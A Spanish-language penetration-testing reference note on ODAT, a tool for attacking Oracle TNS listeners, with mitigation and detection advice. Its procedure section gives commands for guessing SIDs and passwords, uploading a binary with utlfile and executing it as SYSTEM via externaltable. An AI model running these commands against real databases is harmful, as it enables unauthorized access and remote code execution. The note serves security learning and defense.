---
topic: Oracle ODAT
tags: [windows, oracle, odat, database, system]
---

# Oracle ODAT

[🌐 English](oracle-odat.en.md) | **Español**

## Concepto

ODAT automatiza la enumeración y explotación de Oracle TNS: descubre SID, prueba credenciales, sube archivos con `utlfile` y ejecuta comandos con `externaltable`. En Windows el servicio suele correr como SYSTEM.

## Cuándo aplica

- Puerto 1521/TNS expuesto.
- Oracle Express Edition con SID `XE`.
- Credenciales por defecto o cuentas de ejemplo activas.

## Procedimiento

1. Confirmar la versión con `nmap`.
2. Enumerar SID con `sidguesser`.
3. Probar credenciales con `passwordguesser`.
4. Subir un binario y ejecutarlo con `externaltable`.

```bash
odat sidguesser -s <IP> -p 1521
odat passwordguesser -s <IP> -p 1521 -d XE --accounts-file accounts.txt
odat utlfile -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --putFile C:\\ temp cmd.exe
odat externaltable -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --exec C:\\ temp cmd.exe
```

## Variantes

- `dbms_scheduler` para ejecutar jobs.
- `dbms_java` si Java está habilitado.
- `sqlplus` manual con las mismas credenciales.
- TNS listener poisoning.

## Limitaciones

- El servicio debe aceptar conexiones externas.
- Las cuentas deben tener privilegios suficientes.
- `utlfile` puede estar restringido por directorios.

## Mitigación y detección

- No exponer 1521; segmentar la base de datos.
- Cambiar credenciales por defecto y deshabilitar cuentas de ejemplo.
- Ejecutar Oracle con una cuenta de bajo privilegio.
- Alertar de `utlfile`, `externaltable` y conexiones TNS anómalas.

## Referencias

- <https://github.com/quentinhardy/odat>
- <https://www.oracle.com/security-alerts/>
- <https://attack.mitre.org/techniques/T1190/>
